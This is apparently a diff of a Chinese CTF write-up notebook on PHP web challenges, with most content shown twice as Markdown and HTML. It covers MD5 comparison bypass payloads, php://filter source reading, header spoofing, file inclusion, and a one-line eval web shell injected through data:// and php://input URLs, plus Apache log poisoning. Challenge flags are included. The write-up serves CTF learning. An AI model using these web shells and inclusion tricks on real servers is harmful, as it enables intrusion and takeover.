-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e1d1bd9e-image.png)
-
-需要我们提交数据，需要MD5绕过，绕过原理在涉及知识里面
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/d07e9fec-image.png)
-
-看到这个界面，查看网页源码发现
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/3e96bb2e-image.png)
-
-需要我们用GRT传参，使得ab不相等但MD5后可以弱等于，两种方法罗列在前面，这里我用了数组的方式
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/9c2853ef-image.png)
-
-需要POST传参，注意这里使用了强等于’===‘，那么0e开头的方法就不可以使用了，可以继续用数组，用burp suite改成POST传参
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/83c7bb08-image.png)
-
-得到flag
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e8b609f7-image.png)
-
-# [SWPUCTF 2021 新生赛]easy_md5
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8c2bd85d-image.png)
-
-md5数组绕过
-
-# [SWPUCTF 2021 新生赛]easyrce
-
-## eval
-
-把里面的内容当作是一句php命令来执行
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/efe8ea86-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/1bd5c672-image.png)
-
-# [LitCTF 2023]PHP是世界上最好的语言！！
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/122b7f60-image.png)
-
-# [NSSCTF 2022 Spring Recruit]babyphp
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-涉及md5绕过
-
-payload:a[]=2&b1[]=1&b2[]=2&c1=QNKCDZO&c2=s878926199a
-
-前面是数组绕过后面是0e绕过
-
-# [SWPUCTF 2021 新生赛]include
-
-打开靶机提示传一个file,用GET方式传入file=1,页面显示出源码,已知flag在flag.php文件里面那么我们就可以用php://filer伪协议
-
-> 变量=php://filter/convert.base64-encode/resource=文件名
-
-再base64解码即可得到flag
-
-# [极客大挑战 2019]Secret File
-
-## 涉及知识
-
-### PHP伪协议
-
-PHP支持的伪协议
-
+<p>涉及md5绕过</p>
+<p>payload:a[]&#x3D;2&amp;b1[]&#x3D;1&amp;b2[]&#x3D;2&amp;c1&#x3D;QNKCDZO&amp;c2&#x3D;s878926199a</p>
+<p>前面是数组绕过后面是0e绕过</p>
+<h1 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h1><p>打开靶机提示传一个file,用GET方式传入file&#x3D;1,页面显示出源码,已知flag在flag.php文件里面那么我们就可以用php:&#x2F;&#x2F;filer伪协议</p>
+<blockquote>
+<p>变量&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件名</p>
+</blockquote>
+<p>再base64解码即可得到flag</p>
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><h2 id="涉及知识-5"><a href="#涉及知识-5" class="headerlink" title="涉及知识"></a>涉及知识</h2><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>PHP支持的伪协议</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1 file:// — 访问本地文件系统file://本地文件路径</span><br><span class="line">2 http:// — 访问 HTTP(s) 网址</span><br><span class="line">3 ftp:// — 访问 FTP(s) URLs</span><br><span class="line">4 php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">5 zlib:// — 压缩流</span><br><span class="line">6 data:// — 数据（RFC 2397）</span><br><span class="line">7 glob:// — 查找匹配的文件路径模式</span><br><span class="line">8 phar:// — PHP 归档</span><br><span class="line">9 ssh2:// — Secure Shell 2</span><br><span class="line">10 rar:// — RAR</span><br><span class="line">11 ogg:// — 音频流</span><br><span class="line">12 expect:// — 处理交互式的流用于读取php源码内容</span><br><span class="line">13 php://filter ——</span><br></pre></td></tr></table></figure>
 
-php://input 获取post的数据内容
-
-data：//text/plain;base（内容解码）,内容
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/01c35720-image.png)
-
-### 利用filter伪协议绕过死亡exit
-
-死亡exit 通常存在于缓存、配置文件等等不允许用户直接访问的文件当中，避免数据被执行
-
-语法：php://filter/过滤器|过滤器/resource=待过滤的数据流
-
-> 还不理解的：有一些会在过滤器前面加read=，有一些又没有不知道是什么原因
-
-read=<读链的过滤器>：可选项。可以设定一个或多个过滤器名称，以管道符（*\*）分隔。
-
-resource=<要过滤的数据流>：必须项。它指定了你要筛选过滤的数据流。
-
-例子
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/d818f453-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/d66619fa-image.png)
-
+<p>php:&#x2F;&#x2F;input 获取post的数据内容</p>
+<p>data：&#x2F;&#x2F;text&#x2F;plain;base（内容解码）,内容</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/01c35720-image.png" alt="image.png"></p>
+<h3 id="利用filter伪协议绕过死亡exit"><a href="#利用filter伪协议绕过死亡exit" class="headerlink" title="利用filter伪协议绕过死亡exit"></a>利用filter伪协议绕过死亡exit</h3><p>死亡exit 通常存在于缓存、配置文件等等不允许用户直接访问的文件当中，避免数据被执行</p>
+<p>语法：php:&#x2F;&#x2F;filter&#x2F;过滤器|过滤器&#x2F;resource&#x3D;待过滤的数据流</p>
+<blockquote>
+<p>还不理解的：有一些会在过滤器前面加read&#x3D;，有一些又没有不知道是什么原因</p>
+</blockquote>
+<p>read&#x3D;&lt;读链的过滤器&gt;：可选项。可以设定一个或多个过滤器名称，以管道符（**）分隔。</p>
+<p>resource&#x3D;&lt;要过滤的数据流&gt;：必须项。它指定了你要筛选过滤的数据流。</p>
+<p>例子</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d818f453-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d66619fa-image.png" alt="image.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string.rot13  			一种字符处理方式，字符右移十三位</span><br><span class="line">string.toupper 	  	将所有字符转换为大写</span><br><span class="line">string.tolower			将所有字符转换为小写</span><br><span class="line">string.strip_tags		用来处理掉读入的所有标签，例如XML的等等</span><br><span class="line">										在绕过死亡exit大有用处	</span><br></pre></td></tr></table></figure>
 
-转换过滤器： 对数据流进行编码，通常用来读取文件源码
-
+<p>转换过滤器： 对数据流进行编码，通常用来读取文件源码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">convert.base64-encode		用来base64加密</span><br><span class="line">convert.base64-decode			解密</span><br><span class="line"></span><br><span class="line">convert.quoted-printable-encode翻译为可打印字符引用编码，</span><br><span class="line">convert.quoted-printable-decode使用可以打印的ASCII编码的字符表示各种编码形式下的字符</span><br></pre></td></tr></table></figure>
 
-​
-
-### strstr函数
-
-用于查找子字符串，返回字符串中首次出现子串的地址
-
-#### 语法
-
-strstr(str1,str2), 若str2是str1的子串，则返回str2在str1的首次出现的地址；如果str2不是str1的子串，则返回NULL.
-
-​
-
-### href：意思是指定超链接目标的URL，emmmm,后面可以是任何有效文档的相对或绝对URL
-
-## 解题过程
-
-进入后看到如下界面
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e5613f48-image.png)
-
-查看网页源码
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/5b160298-image.png)
-
-，you found me,发现Archive_room.php，点击进入
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/329fc758-image.png)
-
-尝试直接点击SECRET键
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/358ffea7-image.png)
-
-提示回去仔细看，尝试查看achive的源码
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/59aca98a-image.png)
-
-发现action.php,还是没有
-
-猜测在Archive_room.php和action.php网页交互时太快，burp抓包
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e6492c2a-image.png)
-
-发现隐藏，进入
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/45d069d6-image.png)
-
-尝试直接进入flag.php，发现不行，还不理解strstr在这的作用读代码有一个exit（），需要绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/a1a6a6f2-image.png)
-
-利用php伪协议filter的base64-encode过滤器绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/cb9db426-image.png)
-
-解码，发现flag
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/74b5c612-image.png)
-
-# [极客大挑战 2019]Http
-
-当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的
-
-X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/a27f1ba4-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/6be8cd0e-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/0e74deee-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e6b983d9-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/ec2d8013-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/9b2683f5-image.png)
-
-# boogipop文件包含
-
-## 1
-
-题目链接：[http://114.116.119.253:8001/challenge1.php](http://114.116.119.253:8001/challenge1.php)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/3da9fa98-image.png)
-
-### 使用伪协议
-
-代码审计，伪协议尝试，类似题，为什么不可以呜呜呜
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/d1d5de89-image.png)
-
-尝试另一种方法
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/a91ef45c-image.png)
-
-为什么也不行![3cd9cf03.gif](/yuque-notes/03-CTF Challenge's Writeup/assets/3cd9cf03.gif)
-
-好吧，我是傻子，flag在/flag里面，进行base64解码就可以得到flag了
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/199be623-image.png)
-
+<p>​</p>
+<h3 id="strstr函数"><a href="#strstr函数" class="headerlink" title="strstr函数"></a>strstr函数</h3><p>用于查找子字符串，返回字符串中首次出现子串的地址</p>
+<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p>strstr(str1,str2), 若str2是str1的子串，则返回str2在str1的首次出现的地址；如果str2不是str1的子串，则返回NULL.</p>
+<p>​</p>
+<h3 id="href：意思是指定超链接目标的URL，emmmm-后面可以是任何有效文档的相对或绝对URL"><a href="#href：意思是指定超链接目标的URL，emmmm-后面可以是任何有效文档的相对或绝对URL" class="headerlink" title="href：意思是指定超链接目标的URL，emmmm,后面可以是任何有效文档的相对或绝对URL"></a>href：意思是指定超链接目标的URL，emmmm,后面可以是任何有效文档的相对或绝对URL</h3><h2 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h2><p>进入后看到如下界面</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e5613f48-image.png" alt="image.png"></p>
+<p>查看网页源码</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/5b160298-image.png" alt="image.png"></p>
+<p>，you found me,发现Archive_room.php，点击进入</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/329fc758-image.png" alt="image.png"></p>
+<p>尝试直接点击SECRET键</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/358ffea7-image.png" alt="image.png"></p>
+<p>提示回去仔细看，尝试查看achive的源码</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/59aca98a-image.png" alt="image.png"></p>
+<p>发现action.php,还是没有</p>
+<p>猜测在Archive_room.php和action.php网页交互时太快，burp抓包</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e6492c2a-image.png" alt="image.png"></p>
+<p>发现隐藏，进入</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/45d069d6-image.png" alt="image.png"></p>
+<p>尝试直接进入flag.php，发现不行，还不理解strstr在这的作用读代码有一个exit（），需要绕过</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/a1a6a6f2-image.png" alt="image.png"></p>
+<p>利用php伪协议filter的base64-encode过滤器绕过</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/cb9db426-image.png" alt="image.png"></p>
+<p>解码，发现flag</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/74b5c612-image.png" alt="image.png"></p>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的</p>
+<p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/a27f1ba4-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/6be8cd0e-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/0e74deee-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e6b983d9-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ec2d8013-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/9b2683f5-image.png" alt="image.png"></p>
+<h1 id="boogipop文件包含"><a href="#boogipop文件包含" class="headerlink" title="boogipop文件包含"></a>boogipop文件包含</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>题目链接：<a target="_blank" rel="noopener" href="http://114.116.119.253:8001/challenge1.php">http://114.116.119.253:8001/challenge1.php</a></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/3da9fa98-image.png" alt="image.png"></p>
+<h3 id="使用伪协议"><a href="#使用伪协议" class="headerlink" title="使用伪协议"></a>使用伪协议</h3><p>代码审计，伪协议尝试，类似题，为什么不可以呜呜呜</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d1d5de89-image.png" alt="image.png"></p>
+<p>尝试另一种方法</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/a91ef45c-image.png" alt="image.png"></p>
+<p>为什么也不行![]X_2[K<a href="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/3cd9cf03.gif">MEI)M7@FHD{31LH1.gif</a></p>
+<p>好吧，我是傻子，flag在&#x2F;flag里面，进行base64解码就可以得到flag了</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/199be623-image.png" alt="image.png"></p>
 <?php
 
 $flag="HnuSec{challenge1_1s_e4sy_don1_you_think_so?}";
 
 ?>
 
-### 使用一句话木马<?php eval($_POST[1]);?>
-
-**(注:看到另一种<?php @eval($_POST);?>,去查了一下,@ 放在函数前有屏蔽出错信息的作用)**​
-
-刚开始想用，但是不是很理解具体步骤，自己尝试卡了很久，最后参考了群里大佬的步骤才搞懂操作， X﹏X 我是菜狗，膜拜大佬，
-
-URL：[http://114.116.119.253:8001/challenge1.php?BoogipopIsHandsome=data://text/plain,<?php eval($_POST[1]);?](http://114.116.119.253:8001/challenge1.php?BoogipopIsHandsome=data://text/plain,%3C?php%20eval($_POST[1]);?%3E)>
-
-使用data伪协议,将一句话木马植入,蚁剑上号
-
-右键,点击添加数据
-
-![60f10f355ba14dc5.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/ba10f6a6-60f10f355ba14dc5.jpg)
-
-输入URL,密码,就是在一句话木马中设置好的,我的是1,点击测试链接
-
-emmm我也不知道为什么截图这么糊,凑合看看吧
-
-![-6e880ab419a7d835.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/ebcbe934--6e880ab419a7d835.jpg)
-
-然后就可以根据提示在根目录下找到flag了
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/5c9b7042-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/ae742853-image.png)
-
-## 2
-
-### 涉及知识
-
-- file_get_contents() 把整个文件读入一个字符串中。
-- php:/filter伪协议
-- data://伪协议
-
-### 方法一
-
-一开始用php://filter伪协议做出了第一题,然后还没有理解data://伪协议,所以嘎了
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/c7a8fcfa-image.png)
-
-然后找到了绕过
-
-![Screenshot_20230110_210310.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/d1e4fd2f-Screenshot_20230110_210310.jpg)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/15ef1c91-image.png)
-
-害,又不行,最后找了杨师傅帮忙,得出的结果是,这是火狐hackbar的小问题,解决后得到如下,解码即可
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2a2fc32a-image.png)
-
+<h3 id="使用一句话木马"><a href="#使用一句话木马" class="headerlink" title="使用一句话木马"></a>使用一句话木马<?php eval($_POST[1]);?></h3><p>**(注:看到另一种<?php @eval($_POST);?>,去查了一下,@ 放在函数前有屏蔽出错信息的作用)**​</p>
+<p>刚开始想用，但是不是很理解具体步骤，自己尝试卡了很久，最后参考了群里大佬的步骤才搞懂操作， X﹏X 我是菜狗，膜拜大佬，</p>
+<p>URL：<a target="_blank" rel="noopener" href="http://114.116.119.253:8001/challenge1.php?BoogipopIsHandsome=data://text/plain,%3C?php%20eval($_POST%5B1%5D);?%3E">http://114.116.119.253:8001/challenge1.php?BoogipopIsHandsome=data://text/plain,&lt;?php eval($_POST[1]);?</a>&gt;</p>
+<p>使用data伪协议,将一句话木马植入,蚁剑上号</p>
+<p>右键,点击添加数据</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ba10f6a6-60f10f355ba14dc5.jpg" alt="60f10f355ba14dc5.jpg"></p>
+<p>输入URL,密码,就是在一句话木马中设置好的,我的是1,点击测试链接</p>
+<p>emmm我也不知道为什么截图这么糊,凑合看看吧</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ebcbe934--6e880ab419a7d835.jpg" alt="-6e880ab419a7d835.jpg"></p>
+<p>然后就可以根据提示在根目录下找到flag了</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/5c9b7042-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ae742853-image.png" alt="image.png"></p>
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="涉及知识-6"><a href="#涉及知识-6" class="headerlink" title="涉及知识"></a>涉及知识</h3><ul>
+<li>file_get_contents() 把整个文件读入一个字符串中。</li>
+<li>php:&#x2F;filter伪协议</li>
+<li>data:&#x2F;&#x2F;伪协议</li>
+</ul>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>一开始用php:&#x2F;&#x2F;filter伪协议做出了第一题,然后还没有理解data:&#x2F;&#x2F;伪协议,所以嘎了</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/c7a8fcfa-image.png" alt="image.png"></p>
+<p>然后找到了绕过</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d1e4fd2f-Screenshot_20230110_210310.jpg" alt="Screenshot_20230110_210310.jpg"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/15ef1c91-image.png" alt="image.png"></p>
+<p>害,又不行,最后找了杨师傅帮忙,得出的结果是,这是火狐hackbar的小问题,解决后得到如下,解码即可</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2a2fc32a-image.png" alt="image.png"></p>
 <?php
 
 $flag="HnuSec{More_Harder!!!_challenge2_1S_fUnn7!__QWQ}";
 
 ?>
 
-### 方法二
-
-植入一句话木马
-
-url:[http://114.116.119.253:8001/challenge2.php?c=data://text/plain,I%20like%20Boogipop&file=data://text/plain,<?php%20eval($_POST[1]);](http://114.116.119.253:8001/challenge2.php?c=data://text/plain,I%20like%20Boogipop&file=data://text/plain,%3C?php%20eval($_POST[1]);?%3E)>(%20空格绕过),后续操作与之前相同
-
-## 3
-
-### 涉及
-
-进入题目,看到如下界面
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8de7a561-image.png)
-
-代码审计,去搜索了preg_match函数:`用于执行一个正则表达式匹配`,前面有一个!,所以就是ban掉了data伪协议和filter,考虑使用php:/input,
-
-str_replace:`替换字符串中的一些字符(区分大小写)`,php被替换,需要绕过,文件名大小写或者双写绕过phphpp,pphphp都可以,然后post传入一句话木马这里被hackbar背刺了QAQ,
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/74d748bf-image.png)
-
-用burp了抓个包,没有响应,害
-
-改用burp
-
-![2ea23878e3c80f3f.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/16ee0c56-2ea23878e3c80f3f.jpg)
-
-在post行写入一句话木马,再将抓的包返回,连蚁剑,前面的步骤一样,这里特别注意,找到HTTP BODY，将木马写入,点击测试连接,其余步骤相同即可找到flag
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b055a8b8-image.png)
-
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>植入一句话木马</p>
+<p>url:<a target="_blank" rel="noopener" href="http://114.116.119.253:8001/challenge2.php?c=data://text/plain,I%20like%20Boogipop&file=data://text/plain,%3C?php%20eval($_POST%5B1%5D);?%3E">http://114.116.119.253:8001/challenge2.php?c=data://text/plain,I%20like%20Boogipop&file=data://text/plain,&lt;?php%20eval($_POST[1]);</a>&gt;(%20空格绕过),后续操作与之前相同</p>
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><h3 id="涉及"><a href="#涉及" class="headerlink" title="涉及"></a>涉及</h3><p>进入题目,看到如下界面</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8de7a561-image.png" alt="image.png"></p>
+<p>代码审计,去搜索了preg_match函数:<code>用于执行一个正则表达式匹配</code>,前面有一个!,所以就是ban掉了data伪协议和filter,考虑使用php:&#x2F;input,</p>
+<p>str_replace:<code>替换字符串中的一些字符(区分大小写)</code>,php被替换,需要绕过,文件名大小写或者双写绕过phphpp,pphphp都可以,然后post传入一句话木马这里被hackbar背刺了QAQ,</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/74d748bf-image.png" alt="image.png"></p>
+<p>用burp了抓个包,没有响应,害</p>
+<p>改用burp</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/16ee0c56-2ea23878e3c80f3f.jpg" alt="2ea23878e3c80f3f.jpg"></p>
+<p>在post行写入一句话木马,再将抓的包返回,连蚁剑,前面的步骤一样,这里特别注意,找到HTTP BODY，将木马写入,点击测试连接,其余步骤相同即可找到flag</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b055a8b8-image.png" alt="image.png"></p>
 <?php
 
 $flag="HnuSec{Y0u_Are_closer_To_HnuSec!}";
 
 ?>
 
-## 4
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b0ef108a-image.png)
-
-根据提示,百度了log file,是日志文件,而日志文件就是记录系统活动信息的几个文件，如：何时、何地（来源IP）、何人（什么服务名称）、做了什么操作（信息登录）换句话说就是记录系统在什么时候由哪个进程做了什么样的操作时，发生了何种的事件
-
-按照提示,植入一句话木马,尽量使用burp suite来操作,使用hackbar会对<?和空格进行编码,导致木马写入失败(以身试险过),日志文件不会对url解码
-
-先试过hackbar,抓包后是这样的
-
-![屏幕截图_20230111_110023.png](/yuque-notes/03-CTF Challenge's Writeup/assets/5038d31f-屏幕截图_20230111_110023.png)
-
-改好再返回
-
-![屏幕截图_20230111_110004.png](/yuque-notes/03-CTF Challenge's Writeup/assets/31e3b0c7-屏幕截图_20230111_110004.png)
-
-将抓到的包返回后
-
-![屏幕截图_20230111_110053.png](/yuque-notes/03-CTF Challenge's Writeup/assets/77bcf26e-屏幕截图_20230111_110053.png)
-
-查找得知在不同的系统，存放日志文件地方和文件名不同
-apache一般是/var/log/apache/access.log
-
-nginx一般是在/var/log/nginx/access.log和/var/log/nginx/error.log
-
-再根据返回包的信息可以知道,日志的路径是/var/log/apache2/access.log
-
-使用文件包含漏洞包含日志文件
-
-URL:[http://114.116.119.253:8001/challenge4.php?file=/var/log/apache2/access.log](http://114.116.119.253:8001/challenge4.php?file=/var/log/apache2/access.log)
-
-![屏幕截图_20230111_110207.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2e84c2b6-屏幕截图_20230111_110207.png)
-
-可以看到日志文件已经被污染,连接蚁剑就可以找到flag了
-
-flag的位置:/secret/challenge4_flag
-
